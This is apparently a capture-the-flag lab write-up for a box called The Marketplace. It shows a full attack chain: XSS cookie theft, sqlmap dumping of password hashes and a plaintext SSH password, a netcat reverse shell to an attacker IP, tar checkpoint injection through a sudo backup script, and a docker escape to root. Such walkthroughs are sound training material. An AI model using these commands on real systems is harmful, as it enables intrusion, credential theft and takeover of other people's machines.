### nmap result

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp open  http    nginx 1.19.2
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
| http-robots.txt: 1 disallowed entry 
|_/admin
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### account register and login

We can add a `New listing` and see that the description is vulnerable to `XSS`

We then see that there is a `Report listing to admins` we can try if we can steal the admin's cookie by using this python script.

https://github.com/R0B1NL1N/WebHacking101/blob/master/XSS-cookie-stealer.py

We then got the admin cookie and we will change our current cookie with the admin cookie and refresh the page, we should be able to access `/admin` page.

We can then see that it is vulnerable to `SQLi`, we will use the tool `sqlmap`

`sqlmap http://10.10.192.112/admin?user=1 --cookie='token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2OTg5Njk1MTZ9.gAAvVUB2hm1KH4t-ntczzAvjaegy_gGwBDOPpUEgLLc' --technique=U --delay=2 -dump`

We are able to fetch the `marketplace` database

```
+----+--------------------------------------------------------------+----------+-----------------+
| id | password                                                     | username | isAdministrator |
+----+--------------------------------------------------------------+----------+-----------------+
| 1  | $2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW | system   | 0               |
| 2  | $2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q | michael  | 1               |
| 3  | $2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG | jake     | 1               |
| 4  | $2b$10$8nuW.CddjAlmOPd67Xk.YeM.7PawLxgu1KCQ0F4enU2wQkqq9l2Ui | test     | 0               |
+----+--------------------------------------------------------------+----------+-----------------+
```

We also see the `messages` table

```
+----+---------+---------+-----------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | is_read | user_to | user_from | message_content                                                                                                                                                                                   |
+----+---------+---------+-----------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | 1       | 3       | 1         | Hello!\r\nAn automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password.\r\nYour new password is: @b_ENXkGYUCAv3zJ     |
| 2  | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |
| 3  | 1       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |
+----+---------+---------+-----------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
```

We see on the table above that a SSH account's password was changed and generated a password `@b_ENXkGYUCAv3zJ`

Base on the `user_to` it is tagged as `3`, the username and password box, we see that the `id 3` is the user `jake`, we will now try to ssh using the account and see if it will work.

and it works.

`jake@the-marketplace:~$ whoami
jake`

We will run `sudo -l` to check if the account can run any command with sudo.

```
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

We will create a reverse shell using `msfvenom`

```
msfvenom -p cmd/unix/reverse_netcat lhost=10.6.48.114 lport=9001 R
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 97 bytes
mkfifo /tmp/fkobab; nc 10.6.48.114 9001 0</tmp/fkobab | /bin/sh >/tmp/fkobab 2>&1; rm /tmp/fkobab
```

then on the ssh connection, we will move to `/opt/backups/`

and follow these commands that we got from GTFOBins.

```
ake@the-marketplace:/opt/backups$ echo 'mkfifo /tmp/fkobab; nc 10.6.48.114 9001 0</tmp/fkobab | /bin/sh >/tmp/fkobab 2>&1; rm /tmp/fkobab' > shell.sh
jake@the-marketplace:/opt/backups$ ls
backup.sh  backup.tar  shell.sh
jake@the-marketplace:/opt/backups$ echo "" > "--checkpoint-action=exec=sh shell.sh"
jake@the-marketplace:/opt/backups$ echo "" > --checkpoint=1
jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh
Backing up files...
tar: /opt/backups/backup.tar: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
jake@the-marketplace:/opt/backups$ chmod 777 backup.tar shell.sh 
jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh
```

We also need to open a listener to our machine, once we run the `sudo` command we should be able to get a connection.

```
└─# nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.6.48.114] from (UNKNOWN) [10.10.192.112] 42212
id
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)

```

We can see that the user `michael` is part of `docker` group.

Checking GTFOBins again, we can see that we can use docker to escalate our privilege.

#### Shell
It can be used to break out from restricted environments by spawning an interactive system shell.

The resulting is a root shell.

`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

We see that it works and we got root!

```
michael@the-marketplace:/opt/backups$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
t /mnt shn -v /:/mnt --rm -it alpine chroot
# id
id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

